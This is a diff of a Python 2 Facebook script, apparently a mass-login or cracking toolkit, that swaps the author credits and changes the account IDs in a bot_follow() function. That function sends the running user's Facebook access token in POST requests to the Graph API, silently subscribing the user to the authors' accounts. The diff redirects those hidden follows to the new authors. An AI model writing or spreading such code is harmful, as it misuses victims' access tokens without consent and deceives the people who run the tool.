@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8
-# Facebook  : Dapunta Khurayra X
-# Instagram : ratya.anonym.id
+# Facebook  : shadow hacker cyber king
+# Instagram : hackerdx420
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,uuid
 from multiprocessing.pool import ThreadPool
@@ -146,12 +146,12 @@ def bot_follow():
 	except IOError:
 		print("\n   [!] Token invalid")
 		masuk()
-    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
+    	requests.post('https://graph.facebook.com/102537698751441/subscribers?access_token=' + toket)      #overlite overload periodic error
     	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
     	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
     	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
     	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
-    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
+    	requests.post('https://graph.facebook.com/100008647622021/subscribers?access_token=' + toket) #CYBER KING
     	menu()
 			
 def menu():
